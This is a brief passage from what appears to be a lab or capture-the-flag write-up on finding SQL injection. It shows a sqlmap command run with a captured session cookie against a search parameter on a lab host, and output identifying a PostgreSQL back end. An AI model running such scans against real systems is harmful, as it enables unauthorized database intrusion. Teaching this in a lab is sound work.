# SQL Injection Discovery

Capture the authenticated session cookie:

```text
PHPSESSID=...
```

Launch SQLMap:

```bash
sqlmap -u \
"http://10.129.95.174/dashboard.php?search=test" \
--cookie="PHPSESSID=..."
```

SQLMap confirms:

```text
Back-end DBMS: PostgreSQL
```

The search parameter is vulnerable to SQL Injection.

